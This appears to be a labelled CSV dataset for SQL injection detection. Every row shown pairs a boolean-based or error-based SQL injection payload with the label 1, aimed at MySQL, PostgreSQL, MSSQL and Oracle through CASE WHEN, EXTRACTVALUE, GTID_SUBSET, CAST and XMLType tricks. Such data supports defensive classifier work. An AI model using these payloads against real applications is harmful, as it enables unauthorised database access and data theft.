Sentence,Label
"1 AND CASE WHEN 3023=8622 THEN 3023 ELSE JSON(CHAR(117,121,110,87)) END",1
"1 AND CASE WHEN 9258=6175 THEN 9258 ELSE JSON(CHAR(109,118,110,66)) END-- vGJf",1
"1 AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END-- BHKr",1
"1 AND CASE WHEN 2301=2472 THEN 2301 ELSE JSON(CHAR(70,82,83,82)) END-- CYzx",1
"1') AND CASE WHEN 4875=1123 THEN 4875 ELSE JSON(CHAR(74,103,101,112)) END AND ('NCZl'='NCZl",1
"1') AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ('TTwg'='TTwg",1
"1') AND CASE WHEN 5640=9592 THEN 5640 ELSE JSON(CHAR(116,74,65,98)) END AND ('vJmG'='vJmG",1
"1')) AND CASE WHEN 1690=2944 THEN 1690 ELSE JSON(CHAR(88,122,90,72)) END AND (('zrIr'='zrIr",1
"1')) AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND (('pxPc'='pxPc",1
"1')) AND CASE WHEN 5546=1754 THEN 5546 ELSE JSON(CHAR(109,111,73,77)) END AND (('hawn'='hawn",1
"1' AND CASE WHEN 4981=5612 THEN 4981 ELSE JSON(CHAR(83,68,82,83)) END AND 'mTcL'='mTcL",1
"1' AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND 'Gttf'='Gttf",1
"1' AND CASE WHEN 1105=3634 THEN 1105 ELSE JSON(CHAR(100,77,83,102)) END AND 'dUHs'='dUHs",1
"1') AND CASE WHEN 6464=6297 THEN 6464 ELSE JSON(CHAR(102,121,80,104)) END AND ('OyTc' LIKE 'OyTc",1
"1') AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ('yUcZ' LIKE 'yUcZ",1
"1') AND CASE WHEN 9677=4801 THEN 9677 ELSE JSON(CHAR(122,100,108,104)) END AND ('oavW' LIKE 'oavW",1
"1%' AND CASE WHEN 2760=9939 THEN 2760 ELSE JSON(CHAR(101,70,122,119)) END AND 'muHw%'='muHw",1
"1%' AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND 'RmMJ%'='RmMJ",1
"1%' AND CASE WHEN 9089=3886 THEN 9089 ELSE JSON(CHAR(71,90,76,85)) END AND 'boEt%'='boEt",1
"1' AND CASE WHEN 6193=7877 THEN 6193 ELSE JSON(CHAR(87,107,115,113)) END AND 'LkgG' LIKE 'LkgG",1
"1' AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND 'vXgS' LIKE 'vXgS",1
"1' AND CASE WHEN 2634=4405 THEN 2634 ELSE JSON(CHAR(99,104,74,72)) END AND 'FMsI' LIKE 'FMsI",1
"1"") AND CASE WHEN 4905=3116 THEN 4905 ELSE JSON(CHAR(87,69,121,87)) END AND (""FlAJ""=""FlAJ",1
"1"") AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND (""JOvH""=""JOvH",1
"1"") AND CASE WHEN 2105=2129 THEN 2105 ELSE JSON(CHAR(107,121,115,81)) END AND (""nrQQ""=""nrQQ",1
"1"" AND CASE WHEN 9517=2539 THEN 9517 ELSE JSON(CHAR(78,121,112,101)) END AND ""GruX""=""GruX",1
"1"" AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ""Fvrq""=""Fvrq",1
"1"" AND CASE WHEN 7081=1716 THEN 7081 ELSE JSON(CHAR(120,112,115,101)) END AND ""tkHX""=""tkHX",1
(SELECT (CASE WHEN (5826=3849) THEN 1 ELSE (SELECT 3849 UNION SELECT 6264) END)),1
(SELECT (CASE WHEN (2694=2694) THEN 1 ELSE (SELECT 1650 UNION SELECT 1654) END)),1
(SELECT (CASE WHEN (1671=6246) THEN 1 ELSE (SELECT 6246 UNION SELECT 3462) END)),1
(CASE WHEN (5477=9419) THEN 5477 ELSE 5477*(SELECT 5477 FROM DUAL UNION SELECT 9419 FROM DUAL) END),1
(CASE WHEN (6719=6719) THEN 6719 ELSE 6719*(SELECT 6719 FROM DUAL UNION SELECT 7139 FROM DUAL) END),1
(CASE WHEN (1694=5592) THEN 1694 ELSE 1694*(SELECT 1694 FROM DUAL UNION SELECT 5592 FROM DUAL) END),1
(CASE WHEN 9346=8267 THEN 9346 ELSE NULL END),1
(CASE WHEN 1110=1110 THEN 1110 ELSE NULL END),1
(CASE WHEN 6192=9570 THEN 6192 ELSE NULL END),1
"1,(SELECT (CASE WHEN (5181=7603) THEN 1 ELSE 5181*(SELECT 5181 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"1,(SELECT (CASE WHEN (3957=3957) THEN 1 ELSE 3957*(SELECT 3957 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"1,(SELECT (CASE WHEN (7825=4000) THEN 1 ELSE 7825*(SELECT 7825 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"1,(SELECT (CASE WHEN (2885=6236) THEN 1 ELSE 1/(SELECT 0) END))",1
"1,(SELECT (CASE WHEN (6175=6175) THEN 1 ELSE 1/(SELECT 0) END))",1
"1,(SELECT (CASE WHEN (9931=1411) THEN 1 ELSE 1/(SELECT 0) END))",1
"1) AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND (5165=5165",1
"1)) AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ((4606=4606",1
"1 AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671))",1
"1 AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671))-- wskc",1
"1') AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ('CaRD'='CaRD",1
"1')) AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND (('jUZs'='jUZs",1
"1' AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND 'Ocpz'='Ocpz",1
"1') AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ('cDUr' LIKE 'cDUr",1
"1%' AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND 'zZFy%'='zZFy",1
"1' AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND 'KgCh' LIKE 'KgCh",1
"1"") AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND (""oJvb""=""oJvb",1
"1"" AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ""BPWk""=""BPWk",1
"1) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND (1060=1060",1
"1)) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ((7699=7699",1
"1 AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330)",1
"1 AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330)-- IZaX",1
"1') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ('oTqz'='oTqz",1
"1')) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND (('yoGq'='yoGq",1
"1' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND 'dCJm'='dCJm",1
"1') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ('TDvy' LIKE 'TDvy",1
"1%' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND 'UTOR%'='UTOR",1
"1' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND 'ZnCj' LIKE 'ZnCj",1
"1"") AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND (""IgVV""=""IgVV",1
"1"" AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ""nqSM""=""nqSM",1
1) AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (9944=9944,1
1)) AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ((3074=3074,1
1 AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC),1
1 AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC)-- RKTh,1
1') AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('PHbQ'='PHbQ,1
1')) AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (('LXue'='LXue,1
1' AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'DYAI'='DYAI,1
1') AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('kjwX' LIKE 'kjwX,1
1%' AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'NzVr%'='NzVr,1
1' AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'dSxt' LIKE 'dSxt,1
"1"") AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (""XsNv""=""XsNv",1
"1"" AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ""zFRx""=""zFRx",1
1) AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (5869=5869,1
1)) AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ((5453=5453,1
1 AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))),1
1 AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))-- PQnF,1
1') AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('EdeN'='EdeN,1
1')) AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (('ilrD'='ilrD,1
1' AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'Rose'='Rose,1
1') AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('dwUF' LIKE 'dwUF,1
1%' AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'mypr%'='mypr,1
1' AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'PKsS' LIKE 'PKsS,1
"1"") AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (""fmzX""=""fmzX",1
"1"" AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ""dMbv""=""dMbv",1
"1) AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (7786=7786",1
"1)) AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ((6175=6175",1
"1 AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))",1
"1 AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))-- IFTD",1
"1') AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('zlGf'='zlGf",1
"1')) AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (('NrTX'='NrTX",1
"1' AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'zpcj'='zpcj",1
"1') AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('TaiT' LIKE 'TaiT",1
"1%' AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'zfol%'='zfol",1
"1' AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'fkiF' LIKE 'fkiF",1
"1"") AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (""jsYZ""=""jsYZ",1
"1"" AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ""Anfi""=""Anfi",1
"1) AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (2868=2868",1
"1)) AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ((6206=6206",1
"1 AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))",1
"1 AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))-- XSXx",1
"1') AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('PBYM'='PBYM",1
"1')) AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (('yDSM'='yDSM",1
"1' AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'APgF'='APgF",1
"1') AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('OUJq' LIKE 'OUJq",1
"1%' AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'KDXp%'='KDXp",1
"1' AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'LcAU' LIKE 'LcAU",1
"1"") AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (""FNLT""=""FNLT",1
"1"" AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ""BaCl""=""BaCl",1
1) AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (5968=5968,1
1)) AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((3093=3093,1
1 AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL),1
1 AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- NZKB,1
1') AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('rEkW'='rEkW,1
1')) AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (('SUfo'='SUfo,1
1' AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'uIVE'='uIVE,1
